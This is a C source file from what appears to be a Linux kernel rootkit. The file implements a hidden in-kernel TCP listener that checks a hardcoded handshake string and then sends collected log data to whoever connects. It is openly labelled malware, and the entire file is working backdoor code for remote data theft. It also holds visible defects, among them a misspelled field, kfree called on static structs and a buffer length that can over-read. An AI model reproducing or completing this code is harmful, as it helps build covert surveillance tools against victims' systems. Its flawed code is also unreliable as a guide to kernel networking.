/*========================================================*\
	     tcp server that accepts one connection at a time
sites that helped develop code:
https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
https://stackoverflow.com/questions/49340626/creating-a-tcp-server-in-the-kernel-in-c
\*========================================================*/

#include <linux/in.h>
#include <linux/inet.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <linux/string.h>

#include "server.h"

struct client_t{
	struct socket *sock; //structure holding socket object
	struct kvec sock_vec; //holds vector of data recieved
	struct msghdr sock_msg; //structure to hold data recieved
	char *message; //structure to hold message sent or recieved
};
struct server_t{
	struct sockaddr_in s_addr; //structure to specify a transport address and port for the AF_INET address family
	struct socket *sock; //structure holding socket object
	int port;
};

struct client_t client;
struct server_t server;



static int run_server(void *port){
	int err;
	server.port = (unsigned short int) port;

	memset(&(server.s_addr), 0, sizeof(server.s_addr)); //zeroes out the sin_addr

	server.s_addr.sin_family = AF_INET;
	server.s_addr.sin_port = htons(server.port);
	server.s_addr.sin_addr.s_addr = in_aton("0.0.0.0"); //CHECK adress was local address b4hand
	server.sock = (struct socket *)kzalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for server
	if (server.sock == NULL) {
		printk("[rootkit][server.c::run_server] ERROR    kzalloc failed to allocate memory to server.sock\n"); //DEBUG
		return -1;
	}
	client.sock = (struct socket *)kzalloc(sizeof(struct socket), GFP_KERNEL); //allocates memory to the socket for client connection
	if (client.sock == NULL) {
		printk("[rootkit][server.c::run_server] ERROR    kzalloc failed to allocate memory to client.sock\n"); //DEBUG
		return -1;
	}

	err = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &(server.sock)); //creates socket for server
	if (err){
		printk("[rootkit][server.c::run_server] ERROR    unable to create socket: err=%d\n", err); //DEBUG
		return err;
	}
	err = kernel_bind(server.sock, (struct sockaddr *)&(server.s_addr),sizeof(struct sockaddr_in)); //binds server
	if (err<0){
		printk("[rootkit][server.c::run_server] ERROR    unable to bind socket: err=%d\n", err); //DEBUG
		return err;
	}

	err = kernel_listen(server.sock, 1); //listens for connections with 1 backlog
	if (err<0){
		printk("[rootkit][server.c::run_server] ERROR    unable to initiate listening on server socket: err=%d\n", err); //DEBUG
		return err;
	}

	while(true){
		err = kernel_accept(server.sock, &(client.sock), 1);
		if (err<0){
			printk("[rootkit][server.c::run_server] ERROR    unable to accept connection: err=%d\n", err); //DEBUG
			return err;
		}
		printk("[rootkit] run_server- client accepted\n");
		err = client_handler();
		if (err<0){
			printk("[rootkit][server.c::run_server] ERROR    error when handling client: err=%d\n", err); //prints debug info
		}
	}
	return 0;
}

static int remove_server(void){
	sock_release(client.sock);
	kfree(client);
	sock_release(server.sock);
	kfree(server);
	return 0;
}

static int net_send(void){
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int ret;
	if (client.message==NULL||strlen(client.message)==0){ //if no message to be sent
		printk("[rootkit][server.c::net_send] ERROR    no message to be sent"); //DEBUG
		return -1;
	}
	memset(&(client.sock_msg), 0, sizeof(client.sock_msg)); //zeroes out message buffer
	memset(&(client.sock_vec), 0, sizeof(client.sock_vec)); //zeroes out message vector
	client.sock_vec.iov_base = client.message; //sets the data to be sent
	if (strlen(client.message)>BUFFER_SIZE){
		client.sock_vec.iov_len = strlen(client.message); //sets the size of the message
	}
	else{
		client.sock_vec.iov_len = BUFFER_SIZE;
	}

	ret = kernel_sendmsg(client.sock, &(client.sock_msg), &(client.sock_vec), 1, strlen(client.message)); // sends data
	if (ret < 0) { //if error sending message
		printk("[rootkit][server.c::net_send] ERROR    error whilst sending message: err=%d\n", ret); //DEBUG
		return ret;
	}
	else if(ret != strlen(client.message)){ //if not all data sent
		printk("[rootkit][server.c::net_send] ERROR    not all bytes sent: err=%d\n", ret); //DEBUG
		return strlen(client.message)-ret;
	}
	return 0;
}

static int net_recv(void){
	//  https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html
	int err;
	if (client.message == NULL){
		printk("[rootkit][server.c::net_send] DEBUG    client.message is null, allocating memory...\n"); //prints debug info
		client.mesage = kmalloc(BUFFER_SIZE, GFP_KERNEL); //not kzalloc because memory is zeroed out below
	}
	memset(client.message, 0, BUFFER_SIZE); //zeroes out message buffer
	memset(&(client.sock_msg), 0, sizeof(client.sock_msg)); //zeroes out message buffer
	memset(&(client.sock_vec), 0, sizeof(client.sock_vec)); //zeroes out message vector
	client.sock_vec.iov_base=client.message; //sets the location of buffer for recieved data to be placed
	client.sock_vec.iov_len=BUFFER_SIZE; //sets the size of the message
	client.sock_msg.msg_flags=MSG_NOSIGNAL; //sets the flags of the packet

	err = kernel_recvmsg(client.sock, &(client.sock_msg), &(client.sock_vec), BUFFER_SIZE, BUFFER_SIZE, 0);
	if (err < 0){
		printk("[rootkit][server.c::net_send] ERROR    unable to recieve message: err=%d", err); //DEBUG
		return -1;
	}
	return 0;
}



static int client_handler(void){
	printk("[rootkit][server.c::client_handler] DEBUG    client has initiated connection");

	client.message = kzalloc(BUFFER_SIZE, GFP_KERNEL);
	if (client.message == NULL) {
		printk("[rootkit] run_server- buffer zmalloc error!\n"); //DEBUG
		return -1;
	}
	strcpy(client.message, "ablfasksbdedoefjnthvymgb"); //copies basic auth message into buffer
	printk("[rootkit][server.c::client_handler] DEBUG    sending %s\n", client.message);
	net_send();
	net_recv();
	if (strcmp("nbhvcrngmhbncjvkybyvbjn", client.message)!=0){
		printk("[rootkit][server.c::client_handler] DEBUG    invalid auth message recieved\n\t%s\n", client.message); //DEBUG
		return -1;
	}
	get_logs(client.message); //cpies logs into message buffer
	printk("[rootkit][server.c::client_handler] DEBUG    read log files\n");
	net_send();
	return 0;
}
